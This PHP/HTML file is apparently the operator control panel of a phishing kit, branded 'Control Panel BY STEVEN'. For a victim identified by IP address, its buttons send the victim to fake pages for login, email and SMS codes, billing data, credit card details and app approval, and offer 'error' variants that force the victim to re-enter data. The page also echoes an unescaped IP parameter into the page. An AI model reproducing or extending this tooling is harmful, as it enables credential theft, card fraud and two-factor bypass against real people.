<?php
   
    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Control Panel BY STEVEN</title>
        
        <style>
            body {
                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
                min-height: 100vh;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .control-panel {
                background: rgba(15, 15, 15, 0.95);
                border-radius: 15px;
                border: 1px solid #333;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(10px);
            }
            
            .panel-header {
                background: linear-gradient(135deg, #2d2d2d 0%, #1a1a1a 100%);
                border-radius: 15px 15px 0 0;
                padding: 20px;
                border-bottom: 2px solid #444;
            }
            
            .panel-title {
                color: #fff;
                font-weight: 700;
                font-size: 1.8rem;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
                letter-spacing: 1px;
            }
            
            .panel-subtitle {
                color: #ccc;
                font-size: 1rem;
                margin-top: 5px;
            }
            
            .btn-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                padding: 25px;
            }
            
            .control-btn {
                padding: 12px 20px;
                border-radius: 8px;
                font-weight: 600;
                font-size: 0.9rem;
                transition: all 0.3s ease;
                border: none;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .control-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            }
            
            .btn-success {
                background: linear-gradient(135deg, #1e7e34 0%, #145a2c 100%);
            }
            
            .btn-success:hover {
                background: linear-gradient(135deg, #218838 0%, #186429 100%);
            }
            
            .btn-danger {
                background: linear-gradient(135deg, #c82333 0%, #a71e2a 100%);
            }
            
            .btn-danger:hover {
                background: linear-gradient(135deg, #dc3545 0%, #bd2130 100%);
            }
            
            .btn-outline-primary {
                background: linear-gradient(135deg, #007bff 0%, #6f42c1 100%);
                color: white;
                border: none;
            }
            
            .error-icon {
                display: inline-block;
                width: 16px;
                height: 16px;
                background: #fff;
                border-radius: 50%;
                position: relative;
                margin-right: 8px;
                font-weight: bold;
                font-size: 12px;
                line-height: 16px;
            }
            
            .error-icon::before {
                content: "✕";
                color: #c82333;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
            }
            
            .success-icon {
                display: inline-block;
                width: 16px;
                height: 16px;
                background: #fff;
                border-radius: 50%;
                position: relative;
                margin-right: 8px;
                font-weight: bold;
                font-size: 10px;
                line-height: 16px;
            }
            
            .success-icon::before {
                content: "✓";
                color: #1e7e34;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
            }
            
            .status-indicator {
                width: 8px;
                height: 8px;
                border-radius: 50%;
                display: inline-block;
                margin-right: 8px;
            }
            
            .online {
                background: #28a745;
                box-shadow: 0 0 8px #28a745;
            }
            
            .connection-status {
                color: #28a745;
                font-size: 0.9rem;
                font-weight: 600;
            }
        </style>
    </head>

    <body class="d-flex align-items-center">
        
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-lg-10 col-md-12">
                    <div class="control-panel mb-5">
                        <div class="panel-header text-center">
                            <h1 class="panel-title">Control Panel BY STEVEN</h1>
                            <div class="panel-subtitle">
                                <span class="status-indicator online"></span>
                                <span class="connection-status">SYSTEM ONLINE</span>
                            </div>
                        </div>
                        
                        <form method="post" action="infos.php">
                            <input type="hidden" name="step" value="control">
                            <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                            
                            <div class="btn-grid">
                                <button type="submit" class="btn btn-danger control-btn" name="to" value="errorlogin">
                                    <span class="error-icon"></span>LOGIN
                                </button>
                                
                                <button type="submit" class="btn btn-success control-btn" name="to" value="email_code">
                                    <span class="success-icon"></span>EMAIL CODE
                                </button>
                                
                                <button type="submit" class="btn btn-danger control-btn" name="to" value="erroremail_code">
                                    <span class="error-icon"></span>EMAIL CODE
                                </button>
                                
                                <button type="submit" class="btn btn-success control-btn" name="to" value="sms">
                                    <span class="success-icon"></span>SMS
                                </button>
                                
                                <button type="submit" class="btn btn-danger control-btn" name="to" value="errorsms">
                                    <span class="error-icon"></span>SMS
                                </button>
                                
                                <button type="submit" class="btn btn-success control-btn" name="to" value="billing">
                                    <span class="success-icon"></span>BILLING
                                </button>
                                
                                <button type="submit" class="btn btn-danger control-btn" name="to" value="errorbilling">
                                    <span class="error-icon"></span>BILLING
                                </button>
                                
                                <button type="submit" class="btn btn-success control-btn" name="to" value="cc">
                                    <span class="success-icon"></span>CC
                                </button>
                                
                                <button type="submit" class="btn btn-danger control-btn" name="to" value="errorcc">
                                    <span class="error-icon"></span>CC
                                </button>
                                
                                <button type="submit" class="btn btn-outline-primary control-btn" name="to" value="app">
                                    <i class="fas fa-mobile-alt mr-2"></i>APP
                                </button>
                                
                                <button type="submit" class="btn btn-outline-primary control-btn" name="to" value="success">
                                    <i class="fas fa-check-circle mr-2"></i>SUCCESS
                                </button>
                            </div>
                        </form>
                    </div>
                    
                    <div class="text-center text-muted mt-4">
                        <small>© 2025 Control Panel BY STEVEN | Secure Access Interface</small>
                    </div>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

    </body>

</html>